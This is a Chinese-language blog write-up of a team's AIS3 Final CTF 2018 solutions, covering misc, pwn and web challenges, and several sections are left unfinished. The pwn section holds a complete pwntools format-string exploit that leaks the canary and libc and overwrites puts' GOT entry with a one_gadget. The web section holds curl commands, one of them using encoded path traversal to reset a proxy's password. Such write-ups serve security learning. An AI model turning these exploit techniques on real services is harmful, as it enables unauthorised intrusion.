---
title: AIS3 Final CTF - hellOwOrld
date: 2018-10-31 00:56:21
tags:
- AIS3
- CTF
categories:
- CTF
keywords:
- ais3
- ctf
description:
---

我們這隊都是第一次參加 AIS3 Final CTF，結果拿到第 18 名的成績，滿開心的ＸＤ
這邊整理了一些解題過程和思路，有興趣可以看一下～
如果有任何其他思路也歡迎在下面提出！    
<!--more-->

![](https://i.imgur.com/Q2Qi8Is.png)

---
## misc
### Painting bot/100
> This is an AI painting bot. Could you get the flag from the bot?
> (Please remember to back up important files in your system.)
> (Any loss caused by this program will not be covered by us.)
> 
> [http://ctf.ais3.org/files/misc1_artist.exe](https://drive.google.com/open?id=1On546O2kvyqQBWuyNmKYrWIeoMqYf1vn)

這是我原本看到題目後做的事
查看檔案有沒有藏東西
![](https://i.imgur.com/7jnPoMd.png)

發現有HTML，因此用 dd 拆出來，打開後發現沒屁用
![](https://i.imgur.com/KLZ8v8m.png)

> 沒頭緒

> 其實也不需要頭緒，只要和小畫家一起打開就好，然後在他開始控制滑鼠前切到小畫家就好QwQ

----
### RPG/200
> Here is a secret RPGMaker XP game. Win the game and you will get the flag!
> If you don't have rtp, please visit the site at
> https://sites.google.com/site/taiwanrpgplayer/rtp
> and download RPG Maker XP RTP.
> 
> [http://ctf.ais3.org/files/misc2_rpg.exe](https://drive.google.com/open?id=1OsC-rKw_YzSNMbOXR0HH2U4PB_rOwgeX)
> 

    由於作者在開發時使用了有中文名稱的 bgm 檔案，如果跳出`沒有發現檔案 Audio/BGM/巨人`的錯誤訊息，~~恭喜你，作者排擠使用非 Big5 碼的族群~~，想辦法轉區吧 (´・ω・`)

首先，到網路上找到神奇的 rgss decrypter，把所有東西全部解出來

![rgss decrypter](https://i.imgur.com/GKo6vmp.png)

接著到官網下載 RPG Maker XP 開發工具，它可以順便裝好 RTP
開一個新 project 把所有東西丟進去 (或是在 rgss decrypter 點 `Generate Game.rxproj`)，
在 end 的場景左上角會發現一個被框起來的格子 (event)
打開之後就會發現這一行：

![Flaaaaaag!!](https://i.imgur.com/MMgm444.png)

如果把它塞進初始化的 event 裡，遊戲一開始就會跳出 flag 給你看了 OωO

----
### Hat/300
> Every hacker has his/her own hat! Try to customize one for yourself!
> 
> [http://srv03.ctf.ais3.org:9001/](https://drive.google.com/file/d/1P9dRCXg0Ecc9ndyaNIelYF_mwnbCzVyw)

![](https://i.imgur.com/kUsr8WU.png)

聽說找到 `.git` 的資料夾可以還原兩個檔案

---
## pwn
### Baby format/100
> Nothing in the world cannot be solved by a single printf. If there was, try to work with two printf's!
> hint: printf has buffer, and you will only see the output after the buffer is full.
> hint2: maybe try GOT Hijack and return to main
> 
> [http://ctf.ais3.org/files/pwn1_fmt.7z](https://drive.google.com/file/d/1PDaW1fH8j7i0dFUWcFp1Ze2sz4_B6gAI)
> 
> service is on srv01.ctf.ais3.org:5521

```python
import sys
from pwn import *

host = 'srv01.ctf.ais3.org'
port = 5521

if len(sys.argv) > 1:
    r = remote(host, port)
else:
    r = process('./fmt')

main = 0x400646
start_main_offset = 0x21ab0 + 0xe7
one_gadget = 0x10a38c
puts = 0x601018


def get_fmt_payload(value, target):
    global num
    num = num % 256
    if value == num:
        return ''
    elif value > num:
        payload = '%' + str(value-num) + 'c' + target
        num = value
        return payload
    else:
        n = 256-num + value
        num = value
        return '%' + str(n) + 'c' + target


num = 73
payload = 'startLeak:%39$p:%41$p:%43$p:%69$p'
payload += get_fmt_payload(0x46, '%32$hhn')
payload += get_fmt_payload(0x06, '%33$hhn')
payload += get_fmt_payload(0x40, '%34$hhn')
payload += '%10000c'
payload = payload.ljust(0xd0, '\x00')
payload += p64(puts)
payload += p64(puts+0x1)
payload += p64(puts+0x2)

r.sendline(payload)
r.recvuntil('startLeak:')

canary = int(r.recvuntil(':')[:-1], 16)
libc = int(r.recvuntil(':')[:-1], 16) - start_main_offset
ret_addr = int(r.recvuntil(':')[:-1], 16) - 0xe0
print('libc:', hex(libc))
print('canary:', hex(canary))
print('ret_addr:', hex(ret_addr))


gadget = libc+one_gadget

print('gadget:', hex(gadget))
num = 0
payload = get_fmt_payload(gadget&0xff, '%32$hhn')
gadget = gadget >> 8
payload += get_fmt_payload(gadget&0xff, '%33$hhn')
gadget = gadget >> 8
payload += get_fmt_payload(gadget&0xff, '%34$hhn')
gadget = gadget >> 8
payload += get_fmt_payload(gadget&0xff, '%35$hhn')
gadget = gadget >> 8
payload += get_fmt_payload(gadget&0xff, '%36$hhn')
gadget = gadget >> 8
payload += get_fmt_payload(gadget&0xff, '%37$hhn')
gadget = gadget >> 8

payload = payload.ljust(0xd0, '\x00')
payload += p64(puts)
payload += p64(puts+0x1)
payload += p64(puts+0x2)
payload += p64(puts+0x3)
payload += p64(puts+0x4)
payload += p64(puts+0x5)
payload += p64(puts+0x6)

r.sendline(payload)

r.interactive()
```

---
## web 
### Secret message/100
> One secret person embeds a secret message in the website. Could you find the message?
> 
> http://srv02.ctf.ais3.org:8887/

![](https://i.imgur.com/pThCerf.png)

```shell
potocol=GET

i=0
while [ $i -lt 100 ]; do
	
	curl http://srv02.ctf.ais3.org:8887/ -i -X $potocol >> flags.txt 
	potocol=$(curl http://srv02.ctf.ais3.org:8887/ -i -X $potocol | grep Next | cut -f 2 -d ' ' | tr -d "\r")

	echo >> flags.txt 

	i=$[$i+1]
done
```
然後我用手拼起來...

#### Flag
```
AIS3{HtTpMe5h0dI5FunaNdGo0DXDdDdDDDx!}
```

----
### Reverse proxy/200
> Bob setup a simple reverse proxy, and configured some passwords.
> Unfortunately, he lost the password. Could you please help him to find it out?
> [http://ctf.ais3.org/files/web2_main.py](https://drive.google.com/file/d/1PbutKLTmobnLE8BeUWUUtLDBBd0iJOEk)
> 
> http://srv02.ctf.ais3.org:8787/


這題一開始有提供 python 的程式，可以把它執行起來，會比較好研究

在程式中可以看到，編輯中
```shell
curl http://srv02.ctf.ais3.org:8787/%2e%2e/%2e%2e/%2e%2e/password/wa -X POST > /dev/null
curl http://srv02.ctf.ais3.org:8787/wa -X ADMIN -d 'QAQ'
```

#### Flag
```
AIS3{f1aSk_pr0Xy_5Erver_15_N1Ce!!}
```

----
### Invitation letter/300
> Customize your own invitation letter!
> 
> [http://srv03.ctf.ais3.org:9002/](https://drive.google.com/file/d/1PcOLRUYwwu4-lXCAWACOq4dLY0FRoiC-)

![](https://i.imgur.com/E51MKNP.png)

==還沒解完==

robots.txt
http://srv03.ctf.ais3.org:9002/robots.txt

![](https://i.imgur.com/CBWqoJ4.png)


看起來是程式碼
[http://srv03.ctf.ais3.org:9002/files/app.py.old_20180531](https://drive.google.com/file/d/1Ps9jmA5OSr8xCg1jRJnIIl2jxnxde56s)

無法存取的 flag.txt
http://srv03.ctf.ais3.org:9002/files/flag.txt
